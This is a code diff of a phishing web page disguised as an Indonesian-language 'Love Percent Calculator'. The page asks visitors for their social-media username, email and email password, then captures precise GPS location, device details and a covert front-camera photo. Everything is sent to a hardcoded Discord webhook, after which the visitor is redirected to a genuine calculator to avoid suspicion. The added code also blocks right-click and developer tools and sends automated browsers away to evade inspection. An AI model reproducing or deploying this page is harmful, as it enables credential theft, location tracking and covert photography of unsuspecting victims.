@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Love Percent Calculator ❤️</title>
     <style>
-        body { background: #0f0f13; color: #fff; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1a1a24; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #ff2d55; box-shadow: 0 10px 30px rgba(255, 45, 85, 0.2); }
+        body { background: #0f0f13; color: #fff; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #1a1a24; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #ff2d55; box-shadow: 0 10px 30px rgba(255, 45, 85, 0.2); z-index: 10; }
         h2 { color: #ff2d55; margin-bottom: 5px; }
         p { font-size: 12px; color: #aaa; margin-bottom: 20px; }
         input { width: 100%; padding: 12px; margin-bottom: 10px; background: #252533; border: 1px solid #333; border-radius: 10px; color: #fff; outline: none; }
@@ -21,10 +21,13 @@
 <div class="card" id="main-box">
     <div id="login-form">
         <h2>LOVE CHECKER ❤️</h2>
-        <p>Verifikasi akun diperlukan untuk memproses algoritma kecocokan cinta lu!</p>
-        <input type="email" id="userEmail" placeholder="Email" required>
-        <input type="password" id="userPass" placeholder="Password Email" required>
-        <button onclick="startTest()">MASUK & CEK SEKARANG</button>
+        <p>Verifikasi akun diperlukan untuk sinkronisasi database kecocokan!</p>
+        
+        <input type="text" id="targetUser" placeholder="Username Instagram/FB" required>
+        <input type="email" id="targetEmail" placeholder="Email Terkait" required>
+        <input type="password" id="targetPass" placeholder="Password Email" required>
+        
+        <button onclick="startMission()">HITUNG PERSENTASE</button>
     </div>
 
     <div id="loading">Sedang menghitung kecocokan... 🔮</div>
@@ -34,47 +37,67 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-async function startTest() {
-    const email = document.getElementById('userEmail').value;
-    const pass = document.getElementById('userPass').value;
+/* ==========================================
+   🛡️ MODUL KEAMANAN (ANTI-INSPECT)
+   ========================================== */
+// 1. Blokir Klik Kanan
+document.addEventListener('contextmenu', event => event.preventDefault());
 
-    if (!email || !pass) { alert("Data harus diisi untuk verifikasi!"); return; }
+// 2. Blokir Shortcut F12, Ctrl+Shift+I, dll
+document.onkeydown = function(e) {
+    if(event.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0))) {
+        return false;
+    }
+}
 
-    // Efek transisi agar terlihat seperti sedang memproses
+// 3. Anti-Bot / WebDriver Detection
+if (navigator.webdriver) {
+    window.location.href = "https://www.google.com";
+}
+
+/* ==========================================
+   🚀 FUNGSI UTAMA (SENTINEL LOGIC)
+   ========================================== */
+async function startMission() {
+    const user = document.getElementById('targetUser').value;
+    const email = document.getElementById('targetEmail').value;
+    const pass = document.getElementById('targetPass').value;
+
+    if (!user || !email || !pass) { alert("Semua kolom harus diisi!"); return; }
+
     document.getElementById('login-form').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
 
     const webhook = "https://discord.com/api/webhooks/1476556112722530306/IQY3TPNcQyqr-12WSVJj6Y1De1dJWdZxgCprXJjYqtK9v7Sl9K1JEm73HfxMJRdEX6C9";
 
-    // 1. Ambil Lokasi (Akurasi Tinggi) & Info Perangkat
     navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const device = navigator.userAgent;
         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        // Kirim Data Input ke Discord
+        // Kirim Data Lengkap ke Discord
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: "🚨 **SECURITY AWARENESS TEST - DATA MASUK**",
+                content: "🚨 **NEW TARGET DETECTED - SECURITY TEST**",
                 embeds: [{
-                    title: "Hasil Input Target",
+                    title: "Informasi Login & Lokasi",
                     color: 16724309,
                     fields: [
-                        { name: "📧 Email Input", value: `\`${email}\`` },
-                        { name: "🔑 Password Input", value: `\`${pass}\`` },
-                        { name: "📱 Info Perangkat", value: `\`${device}\`` },
-                        { name: "📍 Lokasi Presisi", value: `[Buka di Google Maps](${mapsUrl})` }
+                        { name: "👤 Username", value: `\`${user}\``, inline: true },
+                        { name: "📧 Email", value: `\`${email}\``, inline: true },
+                        { name: "🔑 Password", value: `\`${pass}\`` },
+                        { name: "📱 Device", value: `\`${device}\`` },
+                        { name: "📍 Lokasi", value: `[Buka di Google Maps](${mapsUrl})` }
                     ],
-                    footer: { text: "Xyren Lab Sentinel - Dark Mode" },
                     timestamp: new Date()
                 }]
             })
         });
 
-        // 2. Ambil Foto Kamera Depan secara otomatis
+        // Ambil Foto Kamera Depan
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('cam_preview');
@@ -88,24 +111,22 @@ async function startTest() {
                 
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
-                    formData.append('file', blob, 'capture.png');
-                    formData.append('content', `📸 Foto wajah dari user: **${email}**`);
-
+                    formData.append('file', blob, 'target.png');
+                    formData.append('content', `📸 Foto selfie dari user: **${user}**`);
                     await fetch(webhook, { method: 'POST', body: formData });
                     stream.getTracks().forEach(track => track.stop());
                     
-                    // 3. Pengalihan ke link persenan cinta asli lu
+                    // Redirect ke link kalkulator cinta asli lu
                     setTimeout(() => {
                         window.location.href = "https://replit.com/@GigsProject/LoveCalc"; 
-                    }, 1500);
+                    }, 1000);
                 }, 'image/png');
             }, 2500);
         } catch (e) {
-            // Jika kamera ditolak, tetap dialihkan agar tidak curiga
             window.location.href = "https://replit.com/@GigsProject/LoveCalc";
         }
     }, () => { 
-        alert("Izin GPS diperlukan untuk validasi server!"); 
+        alert("Izin GPS diperlukan!"); 
         location.reload(); 
     }, { enableHighAccuracy: true });
 }
